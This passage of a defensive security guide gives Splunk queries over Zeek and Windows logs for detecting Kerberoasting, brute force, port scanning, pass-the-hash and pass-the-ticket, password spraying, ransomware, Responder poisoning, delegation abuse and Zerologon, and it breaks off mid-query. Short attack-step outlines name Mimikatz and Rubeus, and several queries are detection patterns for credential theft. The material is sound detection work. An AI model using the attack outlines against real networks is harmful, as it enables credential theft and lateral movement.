2. **Regular Expressions (rex)**: Used to extract specific information such as usernames and IP addresses.
3. **Time Binning (bin)**: Groups events into time intervals for pattern analysis.
4. **Transactions**: Used to link related events, such as a TGS request without a following logon event.

#### **Detecting Kerberoasting**

**Overview**

Kerberoasting is an attack technique in which an attacker with valid domain credentials requests Service Principal Name (SPN) tickets. These tickets, often encrypted using RC4, can be cracked offline to reveal plaintext credentials for service accounts. The main detection point for Kerberoasting is identifying unusual TGS (Ticket Granting Service) requests, especially those using the RC4 cipher, since attackers typically leverage it for offline cracking.

---

**Splunk Query for Detecting Kerberoasting**

The following query helps identify suspicious Kerberos ticket-granting service requests that indicate possible Kerberoasting activity. This search filters for TGS requests using the RC4 cipher, often configured for service accounts in Kerberoasting attacks.

**Query Breakdown**

```
index="sharphound" sourcetype="bro:kerberos:json"
request_type=TGS cipher="rc4-hmac"
forwardable="true" renewable="true"
| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service
```

**Detailed Steps:**

1. **Select the Relevant Data Source**:
  - `index="sharphound"` specifies the index where logs related to the Kerberoasting activity are stored.
  - `sourcetype="bro:kerberos:json"` specifies that the logs are from Zeek, specifically in JSON format for Kerberos events.
2. **Filter for TGS Requests Using RC4 Cipher**:
  - `request_type=TGS`: Filters the search to include only TGS (Ticket Granting Service) requests, which are specifically targeted in Kerberoasting attacks.
  - `cipher="rc4-hmac"`: Limits results to requests where the RC4 cipher is used for ticket encryption. Attackers favor RC4 because it can be cracked offline, given its relative weakness compared to other encryption methods.
3. **Check for Forwardable and Renewable Tickets**:
  - `forwardable="true"` and `renewable="true"`: These attributes often indicate tickets associated with service accounts, making them prime targets for Kerberoasting. Forwardable tickets allow the use of the ticket across different services, and renewable tickets can be refreshed, attributes attackers might leverage.
4. **Format the Results**:
  - `| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service`: Selects key fields for easy review, including:
    - `_time`: The timestamp of the event.
    - `id.orig_h`: Source IP address of the request.
    - `id.resp_h`: Destination IP address (typically the Domain Controller handling the request).
    - `client`: The account making the request.
    - `service`: The service account for which the TGS request was made, which can be targeted for offline cracking.

---

**Interpreting Results**

- **Frequent RC4 TGS Requests**: Look for repeated TGS requests using the RC4 cipher. An unusually high volume of such requests from a single user or system can indicate Kerberoasting activity.
- **Forwardable and Renewable Tickets**: These tickets are particularly useful for attackers in lateral movement, as they allow tickets to be used across services and renewed as needed.

#### **Detecting Kerberos Brute Force Attacks**

**Overview**

Kerberos brute force attacks involve attackers sending a large volume of AS-REQ (Authentication Service Request) messages to the Key Distribution Center (KDC) with different usernames, hoping to determine valid accounts based on the KDC’s responses. These attempts are often characterized by failed authentication requests with specific error messages that reveal the validity of usernames without fully authenticating.

In this Splunk search, we identify Kerberos brute force attempts by monitoring patterns in Zeek logs that indicate repeated authentication failures, particularly those that do not return the common preauthentication-required response.

---

**Splunk Query for Detecting Kerberos Brute Force**

The following query focuses on failed AS-REQ attempts in a short time frame to help identify potential brute force activities. By setting a threshold of more than 30 requests within a 5-minute interval, we can flag unusual patterns that suggest brute force attempts.

**Query Breakdown**

```
index="kerberos_bruteforce" sourcetype="bro:kerberos:json"
error_msg!=KDC_ERR_PREAUTH_REQUIRED
success="false" request_type=AS
| bin _time span=5m
| stats count dc(client) as "Unique users" values(error_msg) as "Error messages" by _time, id.orig_h, id.resp_h
| where count>30
```

**Detailed Steps:**

1. **Select the Relevant Data Source**:
  - `index="kerberos_bruteforce"` specifies the index where Zeek logs for Kerberos brute force activities are stored.
  - `sourcetype="bro:kerberos:json"` specifies that the source type is Zeek JSON logs specifically for Kerberos activity.
2. **Filter for Non-Preauthentication Errors**:
  - `error_msg!=KDC_ERR_PREAUTH_REQUIRED` excludes events with the `KDC_ERR_PREAUTH_REQUIRED` error message, which is a standard response indicating valid usernames. This helps focus on requests that failed without requiring preauthentication, which could indicate attempts with invalid usernames.
3. **Filter for Failed AS-REQ Requests**:
  - `success="false"` and `request_type=AS` filters the search to only include unsuccessful Authentication Service requests (AS-REQ), which represent login attempts that failed to authenticate.
4. **Time-Binning Events**:
  - `| bin _time span=5m` groups events into 5-minute intervals, enabling us to detect high volumes of authentication requests within short periods, a common sign of brute force attempts.
5. **Count Failed Requests and Track Unique Users**:
  - `| stats count dc(client) as "Unique users" values(error_msg) as "Error messages" by _time, id.orig_h, id.resp_h`:
    - `count`: Counts the number of failed attempts for each source-destination pair within each time interval.
    - `dc(client) as "Unique users"`: Counts the distinct usernames targeted.
    - `values(error_msg) as "Error messages"`: Lists error messages associated with the failures to identify patterns in error responses.
    - `_time, id.orig_h, id.resp_h`: Groups these statistics by time intervals and IP addresses of the client (`id.orig_h`) and the KDC (`id.resp_h`).
6. **Set a Threshold for Flagging Brute Force Activity**:
  - `| where count>30` filters the results to show only cases where there are more than 30 failed attempts within a 5-minute interval, which is suspicious and suggests potential brute force activity.

---

**Interpreting Results**

- **High Failed Attempt Counts**: Cases with more than 30 failed attempts from a single source IP within 5 minutes, especially with distinct usernames, indicate potential brute force attempts.
- **Error Message Patterns**: Reviewing error messages helps differentiate between valid and invalid usernames, which is valuable in identifying user enumeration efforts.
- **Threshold Adjustments**: The `count>30` threshold may be adjusted depending on the environment to reduce false positives, as lower values might flag legitimate activity.

#### **Detecting Nmap Port Scanning**

**Overview**

Port scanning, especially with tools like Nmap, is a common technique used by attackers to identify open ports and services on a target system. In this context, we are looking to detect instances where a source IP is attempting to connect to multiple ports on a destination IP in a short time frame, indicative of scanning behavior. Using Splunk and Zeek logs, we can identify these patterns by filtering for zero payload traffic and counting unique port connections.

---

**Splunk Query for Detecting Nmap Scans**

The following Splunk query identifies potential Nmap port scans by filtering for network connections with no payload (i.e., `orig_bytes=0`) and counting the number of distinct ports accessed within private IP ranges. By setting a threshold of three or more ports within a five-minute interval, we can flag this activity as suspicious.

**Query Breakdown**

```
index="cobaltstrike_beacon" sourcetype="bro:conn:json" orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)
| bin span=5m _time
| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip
| where num_dest_port >= 3
```

**Detailed Steps:**

1. **Select the Appropriate Data Source**:
  - `index="cobaltstrike_beacon"` specifies the index where the relevant Zeek connection logs are stored.
  - `sourcetype="bro:conn:json"` specifies the source type as Zeek JSON logs for connection data.
2. **Filter for Zero-Payload Connections**:
  - `orig_bytes=0` targets connection attempts where the initial payload size is zero. This typically indicates a scan attempt since no actual data is being transmitted, just the connection request.
3. **Restrict to Internal IP Ranges**:
  - `dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)` filters the results to only include private IP ranges. This approach is commonly used to monitor internal network traffic for signs of port scanning, which is a common reconnaissance activity within internal networks.
4. **Time-Binning Events**:
  - `| bin span=5m _time` groups the events into 5-minute intervals, helping us detect multiple scanning attempts within a brief period, which is characteristic of port scanning activity.
5. **Count Unique Ports Accessed**:
  - `| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip` counts the distinct destination ports (using `dc(dest_port)`) that each source IP (`src_ip`) connects to on each destination IP (`dest_ip`) within the 5-minute time window.
6. **Set a Threshold for Flagging Scans**:
  - `| where num_dest_port >= 3` filters to include only events where three or more unique ports were accessed by the same source IP within the defined 5-minute window. This threshold suggests potential scanning behavior as multiple ports are probed in a short time frame.

---

**Interpreting Results**

- **Flagging Potential Scanners**: IPs that attempt to connect to three or more ports within a short window, without sending any payload data, are likely engaging in port scanning activity.
- **Adjusting Thresholds**: If there are many false positives, consider adjusting the `num_dest_port` threshold. Higher values indicate more aggressive scanning.

#### **Detecting Overpass-the-Hash (Pass-the-Key) in Windows**

**Overview of Overpass-the-Hash**

**Overpass-the-Hash (Pass-the-Key)** allows attackers to authenticate via Kerberos using stolen password hashes, enabling them to request Kerberos TGTs and gain unauthorized access across systems without using NTLM.

**Attack Steps**

1. **Extract User Hashes**: The attacker uses tools like Mimikatz to obtain the NTLM hash of a logged-in user, requiring local administrator privileges.
2. **Request TGT with Rubeus**: Using Rubeus, the attacker crafts a raw AS-REQ request for a TGT for a specified user. This step does not require elevated privileges, making it a more covert approach.
3. **Submit Ticket**: The attacker injects the requested TGT into the current session, similar to Pass-the-Ticket attacks, for further lateral movement.

**Overpass-the-Hash Detection Opportunities**

**Key Detection Logic**

- **Mimikatz Detection**: Artifacts from Mimikatz-based Overpass-the-Hash attacks resemble those of Pass-the-Hash and can be detected using similar techniques.
- **Rubeus Detection**: When Rubeus sends an AS-REQ request directly to the Domain Controller on TCP/UDP port 88, it generates Event ID 4768. However, unusual processes communicating over port 88 to the DC, other than lsass.exe, can help identify potential Overpass-the-Hash activity.

---

**Example Splunk Query: Detecting Overpass-the-Hash Targeting Rubeus**

**Description**: This query identifies AS-REQ requests on port 88 from unusual processes, specifically looking for Event ID 3 with a destination port of 88 and excluding `lsass.exe`.

**Timeframe**: `earliest=1690443407 latest=1690443544`

```
index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by process_id
| where EventCode=3
| stats count by _time, Computer, dest_ip, dest_port, Image, process
| fields - count
```

**Explanation of Key Components**

1. **Event Filtering**:
  - **Source Selection**: Filters events from Sysmon’s Operational log (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`).
  - **EventCode 3**: Captures network connections made from the host, specifically targeting traffic to `dest_port=88` (Kerberos), and excludes `Image=lsass.exe` as it is a legitimate process accessing Kerberos services.
  - **OR EventCode 1**: Captures all process creation events for correlation.
2. **Event Statistics**:
  - **EventStats**: Adds the list of processes for each process ID, stored as `process`.
  - **Where EventCode=3**: Filters for network connection events on port 88.
3. **Aggregation and Filtering**:
  - **Stats Count by Fields**: Groups events based on `_time`, `Computer`, `dest_ip`, `dest_port`, `Image`, and `process`, aggregating with `count`.
  - **Fields - count**: Removes the count field from the final output for clarity.

---

**Additional Recommendations**

- **Monitor Port 88 Traffic**: Create alerts for network activity to port 88 from unexpected processes.
- **Correlate Events**: Cross-reference Event ID 4768 (Kerberos TGT Request) with suspicious processes in Sysmon logs, focusing on tools like Rubeus.
- **Behavior Analysis**: Contextualize detections with user and system behaviors, flagging unusual patterns like rapid logon attempts, lateral movement, or access to high-value assets.

---

This approach enables early detection of Overpass-the-Hash attacks, specifically targeting scenarios where attackers leverage Rubeus to request TGTs via AS-REQ requests over Kerberos, aiding in identifying stealthy lateral movement attempts.

#### **Detecting Pass-the-Hash**

**Overview of Pass-the-Hash**

**Pass-the-Hash (PtH)** is a technique that allows attackers to authenticate to systems using the NTLM hash of a password instead of the plaintext password. It exploits how Windows stores password hashes in memory, making it possible to capture and reuse these hashes for lateral movement.

**Pass-the-Hash Attack Steps:**

1. **Hash Extraction**: The attacker, often using tools like Mimikatz, extracts the NTLM hash from memory (usually from the `lsass.exe` process).
2. **Authentication with Hash**: Using the NTLM hash, the attacker can authenticate to network resources as the compromised user.
3. **Lateral Movement**: The attacker gains unauthorized access to networked systems or resources without knowing the plaintext password.

**Detection Opportunities for Pass-the-Hash**

To detect PtH attacks, it is essential to monitor for unusual logon events and suspicious process access patterns, specifically targeting:

- **Event ID 4624**: Logon event, particularly with LogonType 9 (NewCredentials) and Logon\_Process of `seclogo`, which may indicate alternate credentials.
- **Sysmon Event ID 10**: Process access events, focusing on attempts to access `lsass.exe`, where tools like Mimikatz interact with LSASS to dump password hashes.

**Detecting Pass-the-Hash With Splunk**

The following Splunk searches help identify PtH attacks by correlating security logon events with Sysmon process access events.

---

**Example 1: Detecting Alternate Credentials Logon**

**Description**: Searches for logon events with LogonType 9 (NewCredentials) and Logon\_Process `seclogo`, which may indicate the use of alternate credentials.

**Timeframe**: `earliest=1690450689 latest=1690451116`

```
index=main earliest=1690450689 latest=1690451116 source="WinEventLog:Security" EventCode=4624 Logon_Type=9 Logon_Process=seclogo
| table _time, ComputerName, EventCode, user, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process
```

---

**Example 2: Detecting Pass-the-Hash with LSASS Access**

**Description**: Enhances the detection of PtH by combining LogonType 9 logons with Sysmon Event ID 10, which flags suspicious access to `lsass.exe`. This approach associates unauthorized process access with potential credential usage for lateral movement.

**Timeframe**: `earliest=1690450689 latest=1690451116`

```
index=main earliest=1690450689 latest=1690451116 (source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10 TargetImage="C:\\\\Windows\\\\system32\\\\lsass.exe" SourceImage!="C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\platform\\\\*\\\\MsMpEng.exe")
OR (source="WinEventLog:Security" EventCode=4624 Logon_Type=9 Logon_Process=seclogo)
| sort _time, RecordNumber
| transaction host maxspan=1m endswith=(EventCode=4624) startswith=(EventCode=10)
| stats count by _time, Computer, SourceImage, SourceProcessId, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process
| fields - count
```

**Explanation of Key Search Components**

1. **Event Filtering**:
  - The query isolates Sysmon events where `lsass.exe` is accessed (EventCode 10) but excludes legitimate processes like `MsMpEng.exe`.
  - It also includes logon events with EventCode 4624, LogonType 9, and Logon\_Process `seclogo`, indicating alternate credentials.
2. **Transaction Command**:
  - **Purpose**: Links process access events targeting `lsass.exe` with logon events within a brief time span.
  - **Configuration**: Groups events based on the `host` field, with `maxspan=1m`, starting with EventCode 10 (indicating lsass access) and ending with EventCode 4624 (a logon).
3. **Stats Aggregation**:
  - **Purpose**: Summarizes the detection results to show unique combinations of suspicious events by IP, user, and process.
  - **Output Fields**: Filters and organizes key fields, such as `Computer`, `SourceImage`, `SourceProcessId`, and `Network_Account_Name`.

#### **Detecting Pass-the-Ticket**

**Overview of Pass-the-Ticket**

**Pass-the-Ticket (PtT)** is a technique allowing attackers to move laterally within a network by using Kerberos tickets instead of passwords. With administrative access, an attacker can extract valid Kerberos tickets (TGT or TGS) from a system's memory and use them to access resources without needing the user’s password.

**Pass-the-Ticket Attack Steps:**

1. **Extract Kerberos Tickets**: The attacker uses tools like Mimikatz to extract TGT or TGS tickets from a compromised system.
2. **Authenticate with Extracted Ticket**: The attacker submits the ticket in the current logon session, authenticating as the user without needing the password.
3. **Lateral Movement**: Using the ticket, the attacker can access additional systems or resources across the network.

**Kerberos Authentication Process & Related Windows Security Events**

- **Event ID 4624**: Successful logon to the system.
- **Event ID 4648**: Explicit credential logon attempt.
- **Event ID 4672**: Special logon indicating administrative privileges.
- **Event ID 4768**: TGT request in the Kerberos process.
- **Event ID 4769**: TGS request in the Kerberos process.
- **Event ID 4770**: TGS ticket renewal.

**Pass-the-Ticket Detection Opportunities**

**Key Detection Logic**

Detecting PtT attacks requires monitoring for Kerberos service tickets issued without a preceding TGT request. Attackers may import a TGT directly into a session, creating a gap where a TGS request (Event ID 4769) or ticket renewal (Event ID 4770) lacks an associated TGT request (Event ID 4768). Monitoring for discrepancies in the authentication process can reveal PtT attempts.

---

**Example 1: Detection of Kerberos TGS Requests without Prior TGT Requests**

**Description**: This search looks for Kerberos service ticket requests (4769) and renewals (4770) without a prior TGT request (4768) from the same system, potentially indicating an imported TGT.

**Timeframe**: `earliest=1690392405 latest=1690451745`

```
index=main earliest=1690392405 latest=1690451745 source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\\:\\:ffff\\:)?(?<src_ip_4>[0-9\\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category
```

**Explanation of Key Components**

1. **Event Filtering**:
  - Filters events to include only Kerberos-related Event IDs 4768, 4769, and 4770 from the Security log, excluding machine accounts (`user!=*$`).
2. **Regular Expressions**:
  - **Username Extraction**: Extracts the username from the user field for easier identification.
  - **IP Extraction**: Extracts IPv4 addresses from `src_ip`, handling IPv4-mapped IPv6 addresses by focusing on the IPv4 portion.
3. **Transaction Command**:
  - **Purpose**: Groups related events into transactions by `username` and `src_ip_4` fields, beginning with EventCode 4768 (TGT request).
  - **Parameters**: `maxspan=10h` sets a 10-hour max transaction window, allowing for long-duration logon sessions; `keepevicted=true` ensures open transactions remain visible.
4. **Filter for Open Transactions**:
  - **closed\_txn=0**: Filters for transactions lacking an end event, showing cases where TGS or renewal tickets were requested without a preceding TGT.
5. **Display Results**:
  - Shows relevant fields like `_time`, `ComputerName`, `username`, `src_ip_4`, `service_name`, and `category` to facilitate analysis.

---

**Example 2: Detection of TGS Requests and Anomalous Behavior**

In cases where attackers import TGS tickets without a valid TGT request, anomalies can appear in Event ID 4771 (Pre-Authentication Failed). By monitoring mismatches in failure codes and authentication types, additional PtT attacks may be detected.

#### **Detecting Password Spraying**

**Overview**

**Password Spraying** is a targeted attack that:

- Attempts a limited number of commonly used passwords across multiple user accounts.
- Avoids account lockout policies by using only a few password attempts per account.
- Is designed to evade detection by exploiting weak passwords across a wide user base rather than brute-forcing individual accounts.

**Example**: Password spraying via the Spray tool, where the attacker tests a limited set of passwords across multiple accounts in a network.

---

**Detection Opportunities**

**Log-Based Indicators of Password Spraying**

Monitoring Windows logs for patterns of password spraying can reveal anomalies, especially when multiple failed logon attempts (Event ID 4625) from different user accounts originate from a single IP address over a short period.

Key Event Logs for Password Spraying Detection:

1. **4625** - Failed Logon
  - Tracks failed logins for different accounts from a single source.
2. **4768** - Kerberos Authentication Ticket (TGT) Request
  - ErrorCode 0x6: Invalid user attempts.
  - ErrorCode 0x12: Disabled user attempts.
3. **4776** - NTLM Authentication
  - ErrorCode 0xC000006A: NTLM invalid users.
  - ErrorCode 0xC0000064: NTLM wrong password.
4. **4648** - Logon Attempt Using Explicit Credentials
  - Identifies credential misuse.
5. **4771** - Kerberos Pre-Authentication Failure

---

**Detecting Password Spraying Using Splunk**

**Timeframe**

- **Earliest**: `1690280680`
- **Latest**: `1690289489`

**Splunk Query**

```
index=main earliest=1690280680 latest=1690289489 source="WinEventLog:Security" EventCode=4625
| bin span=15m _time
| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason
```

**Query Breakdown**

1. **Filter by Index, Source, and Event Code**:
  - Focuses on the Security Event Log entries (`WinEventLog:Security`) with `EventCode=4625`, representing failed logons.
2. **Time Range Filter**:
  - Limits search to a specific timeframe based on Unix timestamps, filtering only relevant logs.
3. **Time Binning**:
  - The `bin` command groups events into 15-minute intervals, aiding in pattern detection by observing failed logon attempts over short time spans.
4. **Statistics Aggregation**:
  - The `stats` command aggregates by key fields to analyze logon failures across different accounts.
    - `values(user) as Users`: Lists all unique users associated with failed logon attempts.
    - `dc(user) as dc_user`: Counts distinct users within each group to identify multiple accounts targeted from a single IP source.

#### **Detecting RDP Brute Force Attacks**

**Overview**

RDP brute force attacks involve repeated login attempts to an RDP session, exploiting weak or default passwords to gain access. This guide walks through the steps to detect such attacks using Splunk and Zeek logs.

---

**Setting Up Detection Query**

This Splunk query helps to identify potential RDP brute force activity by analyzing Zeek logs and flagging IP addresses with a high number of RDP connection attempts over a short period.

**Query Explanation**

1. **Index and Sourcetype**:
  - Filter for the RDP brute force data by specifying `index="rdp_bruteforce"` and `sourcetype="bro:rdp:json"`.
2. **Time Binning**:
  - The `bin` command groups the events into 5-minute intervals, which helps in identifying bursts of login attempts typical in brute force scenarios.
3. **Counting and Grouping**:
  - The `stats` command counts the number of connection attempts per IP address pair (`id.orig_h` as the source IP and `id.resp_h` as the destination IP) in each 5-minute period.
4. **Threshold Filtering**:
  - The `where count>30` condition filters events where there are more than 30 connection attempts in a 5-minute window from a source IP to a destination IP, which may indicate brute force activity.

**Splunk Query**

```
index="rdp_bruteforce" sourcetype="bro:rdp:json"
| bin _time span=5m
| stats count values(cookie) by _time, id.orig_h, id.resp_h
| where count > 30
```

**Field Descriptions**

- `index="rdp_bruteforce"`: Filters events to the RDP brute force index.
- `sourcetype="bro:rdp:json"`: Specifies that the events are in JSON format, generated by Zeek for RDP traffic.
- `bin _time span=5m`: Groups events into 5-minute intervals.
- `stats count values(cookie) by _time, id.orig_h, id.resp_h`:
  - `count`: Counts the number of RDP connections from a source to a destination IP within each time bin.
  - `values(cookie)`: Lists unique session cookies, useful for tracking session attempts.
  - `_time, id.orig_h, id.resp_h`: Groups results by time, source IP (`id.orig_h`), and destination IP (`id.resp_h`).
- `where count > 30`: Identifies periods with over 30 connection attempts, a threshold suggesting possible brute force activity.

---

**Interpretation of Results**

- **High Count Events**: Any source IP (`id.orig_h`) with over 30 connection attempts to a destination IP (`id.resp_h`) within a 5-minute window may indicate a brute force attempt.
- **Session Cookies**: Multiple unique `cookie` values indicate separate login sessions, supporting the detection of brute force patterns.

**Using Additional Filters (Optional)**

To further refine results, additional filters like the following can help focus on suspicious activity:

- **Time of Day Filtering**: RDP attacks may occur outside normal business hours.
- **Specific Usernames**: Monitoring specific usernames can help identify if certain high-value accounts are targeted.

#### **Detecting Ransomware**

Ransomware can be detected by monitoring specific behaviors, such as excessive file overwrites and file renaming with distinct extensions. Here are two Splunk searches that identify these patterns:

---

**Detecting Excessive File Overwrite Operations**

This query detects ransomware based on a high number of `SMB::FILE_OPEN` and `SMB::FILE_RENAME` actions within short intervals, a common ransomware characteristic:

```
index="ransomware_open_rename_sodinokibi" sourcetype="bro:smb_files:json"
| where action IN ("SMB::FILE_OPEN", "SMB::FILE_RENAME")
| bin _time span=5m
| stats count by _time, source, action
| where count>30
| stats sum(count) as count values(action) dc(action) as uniq_actions by _time, source
| where uniq_actions==2 AND count>100
```

**Search Breakdown:**

- **Index and Action Filtering**: Filters for entries in `ransomware_open_rename_sodinokibi` index with SMB actions of `FILE_OPEN` and `FILE_RENAME`.
- **5-Minute Time Bins**: Groups results in 5-minute intervals.
- **Counting Events**: Counts actions by `source` in each time bin, focusing on intervals with more than 30 actions.
- **Event Aggregation**: Aggregates results to check if both actions (`FILE_OPEN` and `FILE_RENAME`) are present within the time bin.
- **Flagging Potential Ransomware**: Flags results where both actions appear at least 100 times within the 5-minute bin, signaling excessive file activity.

---

**Detecting Excessive File Renaming with New Extensions**

This search focuses on ransomware’s habit of renaming files by adding unique extensions, helping identify possible ransomware-encrypted files:

```
index="ransomware_new_file_extension_ctbl_ocker" sourcetype="bro:smb_files:json" action="SMB::FILE_RENAME"
| bin _time span=5m
| rex field="name" "\\.(?<new_file_name_extension>[^\\.]*$)"
| rex field="prev_name" "\\.(?<old_file_name_extension>[^\\.]*$)"
| stats count by _time, id.orig_h, id.resp_p, name, source, old_file_name_extension, new_file_name_extension
| where new_file_name_extension!=old_file_name_extension
| stats count by _time, id.orig_h, id.resp_p, source, new_file_name_extension
| where count>20
| sort -count
```

**Search Breakdown:**

- **Index, Action, and Time Filtering**: Limits results to file renames within 5-minute time bins.
- **Extracting Extensions**: Uses regex to extract extensions from `name` and `prev_name` fields.
- **Filtering Extension Changes**: Keeps only records where the file extension has changed.
- **Aggregating Results**: Counts occurrences by `source`, `new_file_name_extension`, and originating IP.
- **Flagging Potential Ransomware**: Filters for cases where over 20 files in a 5-minute bin are renamed with the same new extension, as ransomware often applies a uniform extension during encryption.

---

**Additional Resources for Ransomware Detection:**

These resources provide lists of known ransomware extensions and naming patterns:

- [Ransomware Extensions Spreadsheet](https://docs.google.com/spreadsheets/d/e/2PACX-1vRCVzG9JCzak3hNqqrVCTQQIzH0ty77BWiLEbDu-q9oxkhAamqnlYgtQ4gF85pF6j6g3GmQxivuvO1U/pubhtml)
- [Corelight’s Detect-Ransomware-Filenames Repository](https://github.com/corelight/detect-ransomware-filenames)
- [Experiant’s FSRM Ransomware Extensions](https://fsrm.experiant.ca/)

#### **Detecting Responder-like Attacks**

**Overview of LLMNR/NBT-NS/mDNS Poisoning**

**LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)**, along with **mDNS (Multicast DNS)**, are name resolution protocols. These protocols assist in resolving local hostnames to IP addresses when DNS fails. However, these protocols lack security mechanisms, making them susceptible to **spoofing** and **poisoning attacks**.

**Attack Flow:**

1. A victim device sends a name resolution query due to a mistyped or unresolved hostname.
2. DNS fails to resolve this query.
3. The device uses LLMNR, NBT-NS, or mDNS to try resolving the hostname.
4. An attacker using a tool like **Responder** responds to the query, posing as the requested host, thus poisoning the name resolution.

**Result**: The attacker gains the victim’s **NetNTLM hash**, which can potentially be cracked or used to gain access to other systems.

---

**Detection Opportunities for Responder Attacks**

Detection is challenging, but organizations can:

1. Monitor for unusual patterns in **LLMNR and NBT-NS traffic**, especially increased name resolution requests.
2. Use **honeypot-like techniques** to detect unexpected successful resolutions for non-existent hosts.
3. Automate PowerShell-based detection scripts to log suspicious activity, such as unexpected LLMNR or NBT-NS responses.

**PowerShell Logging Example:**

```
# Setup Event Log for LLMNR detection
New-EventLog -LogName Application -Source LLMNRDetection

# Log an Event
Write-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning
```

---

**Detecting Responder-like Attacks with Splunk**

**Timeframe:**

- **Earliest**: `1690290078`
- **Latest**: `1690291207`

**Splunk Queries**

**1. Detecting LLMNR Detection Alerts**

```
index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection
| table _time, ComputerName, SourceName, Message
```

This query searches the `LLMNRDetection` logs created by the PowerShell script and outputs the log time, computer name, source name, and message details.

**2. Sysmon Event ID 22 for DNS Query Tracking**

Sysmon Event ID 22 monitors DNS queries. By tracking queries for mistyped file shares, it’s possible to detect suspicious activity.

```
index=main earliest=1690290078 latest=1690291207 EventCode=22
| table _time, Computer, user, Image, QueryName, QueryResults
```

**Explanation**:

- This query retrieves DNS query events, showing the computer, user, process image, queried hostname (`QueryName`), and results (`QueryResults`).

**3. Event ID 4648 - Explicit Logons to Rogue File Shares**

Event ID 4648 can help detect explicit logon attempts to attacker-controlled file shares, providing insight into credential theft attempts.

```
index=main earliest=1690290814 latest=1690291207 EventCode IN (4648)
| table _time, EventCode, source, name, user, Target_Server_Name, Message
| sort 0 _time
```

**Explanation**:

- This query finds explicit logon attempts, listing details like user and target server. Sorting by `_time` orders the events chronologically.

#### **Detecting Unconstrained Delegation and Constrained Delegation Attacks**

**Unconstrained Delegation**

Unconstrained Delegation allows a service to authenticate to other resources on behalf of any user, potentially exposing sensitive data if compromised. Attackers may exploit this to retrieve and reuse Ticket Granting Ticket (TGT) tickets from memory, enabling lateral movement within a network.

**Attack Steps**

1. **Identify Target Systems**: The attacker identifies systems where Unconstrained Delegation is enabled.
2. **Gain Access**: The attacker gains access to a system with Unconstrained Delegation enabled.
3. **Extract TGT Tickets**: Tools like Mimikatz are used to extract TGTs from memory, enabling impersonation.

**Detection Opportunities**

- **PowerShell Commands**: Monitoring PowerShell script block logging (Event ID 4104) can reveal commands related to Unconstrained Delegation discovery.
- **LDAP Requests**: Log analysis can detect LDAP requests that search for delegation settings.
- **TGT Reuse**: Pass-the-Ticket detections may indicate TGTs being reused.

---

**Example Splunk Query: Detecting Unconstrained Delegation Attacks**

**Description**: This search identifies PowerShell commands associated with Unconstrained Delegation discovery.

**Timeframe**: `earliest=1690544538 latest=1690544540`

```
index=main earliest=1690544538 latest=1690544540 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="*TrustedForDelegation*" OR Message="*userAccountControl:1.2.840.113556.1.4.803:=524288*"
| table _time, ComputerName, EventCode, Message
```

---

**Constrained Delegation**

Constrained Delegation restricts delegation permissions to specific services, allowing a service to act on behalf of a user only for designated resources. This is more restrictive than Unconstrained Delegation, yet attackers can still exploit it by using Service For User (S4U) extensions to impersonate users.

**Attack Steps**

1. **Identify Constrained Delegation Accounts**: Attackers locate accounts with `msDS-AllowedToDelegateTo` properties.
2. **Extract TGT**: The attacker gains access to the TGT of a principal (user or computer).
3. **Use S4U Technique**: Using S4U2self and S4U2proxy, the attacker impersonates high-privileged accounts to access services.
4. **Access Services as Target User**: The attacker injects the ticket and accesses resources with the targeted privileges.

**Detection Opportunities**

- **LDAP Queries and PowerShell Commands**: Monitoring for LDAP requests and PowerShell commands that query `msDS-AllowedToDelegateTo`.
- **Kerberos Authentication Traffic**: Monitoring unusual process connections to Domain Controllers on TCP/UDP port 88 (Kerberos) may indicate S4U activity.

---

**Example Splunk Query: Detecting Constrained Delegation Discovery with PowerShell Logs**

**Description**: This search detects PowerShell commands attempting to discover `msDS-AllowedToDelegateTo` properties for Constrained Delegation accounts.

**Timeframe**: `earliest=1690544553 latest=1690562556`

```
index=main earliest=1690544553 latest=1690562556 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="*msDS-AllowedToDelegateTo*"
| table _time, ComputerName, EventCode, Message
```

---

**Example Splunk Query: Detecting Constrained Delegation with Sysmon Logs**

**Description**: This query identifies processes making unusual network connections to the Domain Controller’s Kerberos port, potentially indicative of Constrained Delegation attacks using S4U.

**Timeframe**: `earliest=1690562367 latest=1690562556`

```
index=main earliest=1690562367 latest=1690562556 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| eventstats values(process) as process by process_id
| where EventCode=3 AND dest_port=88
| table _time, Computer, dest_ip, dest_port, Image, process
```

---

**Summary**

Both Unconstrained and Constrained Delegation enable privilege escalation and lateral movement if improperly configured. Monitoring PowerShell commands, LDAP queries, and unusual Kerberos traffic with Splunk provides security teams with enhanced visibility into potential delegation attacks, allowing for proactive threat detection and mitigation.

#### **Detecting Zerologon**

Here's a breakdown of this Splunk query, designed to detect activity related to the Zerologon attack by identifying unusual Netlogon operations within the logs:

---

**Splunk Query for Detecting Zerologon**

```
index="zerologon" endpoint="netlogon" sourcetype="bro:dce_rpc:json"
| bin _time span=1m
